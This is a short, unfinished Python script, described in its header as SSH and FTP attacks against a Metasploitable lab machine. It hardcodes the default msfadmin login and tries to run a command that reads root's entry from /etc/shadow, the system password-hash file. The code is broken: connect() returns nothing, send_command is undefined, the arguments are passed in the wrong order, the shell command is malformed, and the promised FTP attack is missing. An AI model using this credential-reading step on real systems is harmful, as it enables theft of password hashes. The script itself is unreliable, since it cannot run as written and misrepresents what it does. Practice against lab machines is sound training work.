#!/usr/bin/python

import pexpect

#Author: Daniel Edwards
#Description: SSH & FTP attacks against metasploitable machine


def connect(user,host,password):
	ssh_newkey = 'Are you sure you want to continue connecting?'


def main():
	
	host =""
	user = "msfadmin"
	password = "msfadmin"
	child = connect(host,user,password)
	send_command(child, 'cat/etc/shadow | grep root;ps')




